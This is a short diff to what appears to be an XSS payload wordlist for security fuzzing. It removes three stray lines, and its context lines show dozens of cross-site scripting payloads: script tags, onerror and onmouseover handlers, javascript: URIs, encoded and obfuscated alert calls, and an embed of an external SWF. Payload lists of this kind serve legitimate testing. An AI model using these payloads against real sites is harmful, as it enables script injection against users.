@@ -194,7 +194,6 @@ exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);
 <script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
 "><img src=x onerror=window.open('https://www.google.com/');>
 <style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
-
 <;IMG SRC=`javascript:alert(";RSnake says, ';XSS';";)`>;
 <embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
 <IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
@@ -632,7 +631,6 @@ a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d);
 <script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
 <IMG onmouseover="alert('xxs')">
 <;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
->"
 <a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
 <script charset="\x22>javascript:alert(1)</script>
 <object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
@@ -772,7 +770,6 @@ alert(String.fromCharCode(88,83,83));'))">
 "`'><script>\x0Cjavascript:alert(1)</script>
 <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
 <SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
-">
 g'"></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250
 "><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 <img/src=`%00` onerror=this.onerror=confirm(1)
